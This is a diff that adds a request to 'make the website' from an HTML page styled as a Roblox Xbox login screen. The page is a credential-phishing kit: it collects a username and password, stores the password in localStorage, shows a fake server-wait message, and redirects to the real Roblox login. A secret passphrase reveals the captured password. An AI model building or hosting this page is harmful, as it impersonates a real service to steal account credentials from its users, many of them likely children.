@@ -1,0 +1,168 @@
+Can you make the website with this script
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Roblox Xbox Login</title>
+  <style>
+    /* Reset default styles */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    /* Body styling */
+    body {
+      background: url('https://robloxfandom.com/wiki/File:Roblox_Xbox_Login_Screen.jpg') no-repeat center center fixed;
+      background-size: cover;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: white;
+    }
+
+    /* Overlay to darken the background */
+    .overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.6);
+    }
+
+    /* Text container */
+    .text-container {
+      position: relative;
+      z-index: 1;
+      text-align: center;
+      width: 300px;
+    }
+
+    /* Main text styling */
+    h1 {
+      font-size: 2.5rem;
+      font-weight: bold;
+      color: #ff0000;
+      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.7);
+      margin-bottom: 20px;
+    }
+
+    /* Label styling */
+    label {
+      font-size: 1.2rem;
+      color: #ffffff;
+      margin-bottom: 10px;
+      display: block;
+    }
+
+    /* Input field styling */
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #444;
+      border-radius: 5px;
+      background-color: #333;
+      color: white;
+      font-size: 1rem;
+    }
+
+    /* Button styling */
+    button {
+      width: 100%;
+      padding: 14px;
+      background-color: #ff0000;
+      border: none;
+      border-radius: 5px;
+      color: white;
+      cursor: pointer;
+      font-size: 16px;
+      margin-top: 10px;
+    }
+
+    button:hover {
+      background-color: #d10000;
+    }
+
+    /* Status message styling */
+    #status-message {
+      font-size: 1.2rem;
+      color: #ffffff;
+      margin-top: 20px;
+    }
+
+    /* Display password styling */
+    #display-password {
+      font-size: 1rem;
+      color: #00ff00;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="overlay"></div>
+  <div class="text-container" id="login-container">
+    <h1>beta_Xbox_developer_login_test</h1>
+    <div id="password-form">
+      <label for="password">Password</label>
+      <input type="password" id="password" placeholder="Enter password">
+      <button onclick="checkPassword()">Log In</button>
+      <div id="display-password" style="display: none;"></div>
+    </div>
+    <div id="user-form" style="display: none;">
+      <label for="username">Username</label>
+      <input type="text" id="username" placeholder="Enter username">
+      <label for="user-password">Password</label>
+      <input type="password" id="user-password" placeholder="Enter password">
+      <button onclick="submitLogin()">Submit</button>
+    </div>
+    <div id="status-message" style="display: none;"></div>
+  </div>
+
+  <script>
+    function checkPassword() {
+      const passwordInput = document.getElementById('password');
+      const password = passwordInput.value.trim();
+      const displayPasswordDiv = document.getElementById('display-password');
+
+      if (password.toLowerCase() === 'skibidi toilet') {
+        const storedPassword = localStorage.getItem('storedUserPassword');
+        if (storedPassword) {
+          displayPasswordDiv.innerText = 'Last entered password: ' + storedPassword;
+        } else {
+          displayPasswordDiv.innerText = 'No stored password found.';
+        }
+        displayPasswordDiv.style.display = 'block';
+      } else if (password === '77102_xbx') {
+        document.getElementById('password-form').style.display = 'none';
+        document.getElementById('user-form').style.display = 'block';
+      } else {
+        alert('Incorrect password. Please try again.');
+      }
+    }
+
+    function submitLogin() {
+      const username = document.getElementById('username').value.trim();
+      const password = document.getElementById('user-password').value;
+
+      // Store the password in localStorage
+      localStorage.setItem('storedUserPassword', password);
+
+      document.getElementById('user-form').style.display = 'none';
+      const statusMessage = document.getElementById('status-message');
+      statusMessage.innerText = 'server_admin_request_wait';
+      statusMessage.style.display = 'block';
+
+      setTimeout(function() {
+        window.location.href = 'https://www.roblox.com/login';
+      }, 3000); // Redirects after 3 seconds
+    }
+  </script>
+</body>
+</html>
